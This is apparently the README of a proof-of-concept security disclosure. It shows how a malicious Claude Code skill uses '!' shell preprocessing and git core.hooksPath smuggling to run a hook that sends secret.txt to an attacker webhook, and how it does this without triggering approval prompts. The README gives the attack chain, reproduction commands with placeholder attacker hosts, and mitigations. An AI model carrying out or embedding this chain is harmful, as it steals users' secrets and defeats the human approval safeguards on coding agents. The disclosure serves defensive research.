# malicious-claude

PoC: RCE via malicious Claude Code skill using `!` dynamic context injection and git hook smuggling.

## How it works

Claude Code skills support `!`backtick`` injection — shell commands that execute **before** Claude sees anything, with their output injected as context. Combined with git's `core.hooksPath`, this enables silent RCE with zero approval prompts.

**Attack chain:**

```
Victim asks "can you review my code?"
  → Claude loads code-review skill
  → !` injection fires (preprocessing, invisible to Claude)
      → git fetch   — pulls attacker's hook from remote repo
      → git worktree add — checks out hook with executable bit intact
      → git config core.hooksPath — redirects git hook lookup
      → git commit --allow-empty — triggers the hook
          → hook exfiltrates secret.txt to attacker listener
  → Claude returns a normal-looking code review
```

Claude never sees the commands. The victim approves nothing. Output is `✓ Standards synchronized`.

## Structure

```
poc/
├── attacker/
│   └── hooks/
│       └── pre-commit      # payload: exfiltrates secret.txt to webhook
└── victim/
    ├── secret.txt           # dummy target file
    └── .claude/
        ├── settings.json    # victim's Claude settings (git:* allowed)
        └── skills/
            └── code-review/
                └── SKILL.md # malicious skill with !` injection
```

## Reproduce

### 1. Attacker setup

Edit `poc/attacker/hooks/pre-commit` and set your webhook URL:
```bash
WEBHOOK="http://<YOUR_IP>:9292"
```

Push `poc/attacker/` content to a public git repo on a dedicated branch:
```bash
cd poc/attacker
git init && git checkout -b standards
git add hooks/pre-commit
git update-index --chmod=+x hooks/pre-commit  # preserve executable bit
git commit -m "add standards"
git remote add origin https://github.com/<YOU>/<REPO>.git
git push origin standards
```

Edit `poc/victim/.claude/skills/code-review/SKILL.md` and fill in the placeholders:
```
<ATTACKER_ORG>/<ATTACKER_REPO>.git  →  your repo
<ATTACKER_BRANCH>                   →  standards (or whatever you used)
```

### 2. Start listener

```bash
gitar webhook -b
# listening on :9292
```

### 3. Victim setup

Initialize a git repo with the victim files:
```bash
cp -r poc/victim /tmp/victim-repo
cd /tmp/victim-repo
git init && git commit --allow-empty -m "init"
```

The `.claude/settings.json` pre-authorizes all git commands (realistic for a developer).

Install the skill globally (simulates social engineering: *"run this to get our shared code-review skill"*):
```bash
mkdir -p ~/.claude/skills/code-review
cp .claude/skills/code-review/SKILL.md ~/.claude/skills/code-review/SKILL.md
```

Or keep it project-scoped (skill is already in `.claude/skills/`).

### 4. Trigger

```bash
cd /tmp/victim-repo
claude
```

In the Claude session:
> can you review my code?

Claude invokes the `code-review` skill automatically based on description match.

### 5. Observe

Your listener receives a POST with the base64-encoded contents of `secret.txt`:
```json
{"host":"victims-machine","user":"alice","data":"c3VwZXJfc2VjcmV0..."}
```

Decode: `echo "c3VwZXJfc2VjcmV0..." | base64 -d`

Claude returns a legitimate-looking code review. No approval prompts were shown.

## Why it works

| Property | Detail |
|---|---|
| Invisible to Claude | `!` injection runs at preprocessing time — Claude only sees stdout |
| No approval prompts | All commands start with `git`, matched by `Bash(git:*)` allow rule |
| Executable bit preserved | `git worktree add` checks out files with their stored mode (100755) |
| Legitimate-looking | Victim sees a real code review; output says `✓ Standards synchronized` |
| Persistent | `core.hooksPath` stays set after the session |

## Mitigations

- Treat skill files like executable code — review before installing
- Do not auto-allow broad patterns like `Bash(git:*)` in settings
- Audit `.claude/skills/` and `~/.claude/skills/` regularly
- Prefer `disable-model-invocation: true` on skills with side effects
- Anthropic could sandbox or require explicit approval for `!` injection commands
